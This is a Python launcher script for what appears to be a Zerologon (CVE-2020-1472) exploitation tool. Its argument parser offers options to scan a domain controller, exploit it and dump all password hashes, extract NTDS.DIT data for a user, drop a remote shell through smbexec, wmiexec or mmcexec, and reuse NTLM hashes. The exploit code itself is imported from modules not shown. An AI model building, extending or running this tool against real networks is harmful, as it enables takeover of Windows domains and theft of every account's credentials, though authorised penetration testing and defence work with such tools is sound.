from utils.universal import *
from utils.exploit import *
import sys, argparse, logging

def  banner():
  return """

     _         _       _____              _                         
    / \  _   _| |_ ___|__  /___ _ __ ___ | | ___   __ _  ___  _ __  
   / _ \| | | | __/ _ \ / // _ \ '__/ _ \| |/ _ \ / _` |/ _ \| '_ \ 
  / ___ \ |_| | || (_) / /|  __/ | | (_) | | (_) | (_| | (_) | | | |
 /_/   \_\__,_|\__\___/____\___|_|  \___/|_|\___/ \__, |\___/|_| |_|
                                                  |___/                  

  """

def run(options):
    if options.debug:
        logging.getLogger().setLevel(logging.DEBUG)
    
    if options.dcname is None:
        options.dcname = getMachineName(options.dc_ip)[0]
    
    if options.domain is None:
        options.domain = getMachineName(options.dc_ip)[1]
    
    st = restore_dump("",options)
    if options.shell:
        st.Automatic_recovery_shell()
    
    elif options.recovery:
        st.Manual_recovery()
    else:
        attack(options)



if __name__ == '__main__':
    print(banner())
    parser = argparse.ArgumentParser(add_help = True, description = "CVE-2020-1472 Zerologon")
    parser.add_argument('dc_ip', action='store', help='IP of the domain controller to use')
    parser.add_argument('-scan', action='store_true', help='Scan for CVE-2020-1472 vulnerability')
    parser.add_argument('-exp', action='store_true', help='CVE-2020-1472 Exploits and dump all hashes')
    parser.add_argument('-user', action='store', metavar='USERNAME',
                        help='Extract only NTDS.DIT data for the user specified. Only available for DRSUAPI approach')
    parser.add_argument('-shell', action='store_true', help='Drop a shell via smbexec')
    parser.add_argument('-recovery', action='store_true', help='Restore the domain controller machine hash')
    parser.add_argument('-dcname', action='store', help='Domain controller machine name')
    parser.add_argument('-domain', action='store', help='Domain name')
    parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')

    exec =  parser.add_argument_group('execute options')
    exec.add_argument('-port', choices=['135', '139', '445'], nargs='?', default='445', metavar="destination port",
                        help='Destination port to connect to SMB Server')
    exec.add_argument('-exec-method', choices=['smbexec', 'wmiexec', 'mmcexec'], nargs='?', default='smbexec', help='Remote exec '
                          'method to use at target (only when using -use-vss). Default: smbexec')
    exec.add_argument('-share', action='store', default='ADMIN$', help='share where the output will be grabbed from (default ADMIN$)')
    exec.add_argument('-shell-type', action='store', default = 'cmd', choices = ['cmd', 'powershell'], help='choose '
                        'a command processor for the semi-interactive shell')
    exec.add_argument('-codec', action='store', default='GBK', help='Sets encoding used (codec) from the target\'s output (default "GBK").')
    exec.add_argument('-hashes', action="store", metavar="LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH')

    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)

    options = parser.parse_args()
    run(options)
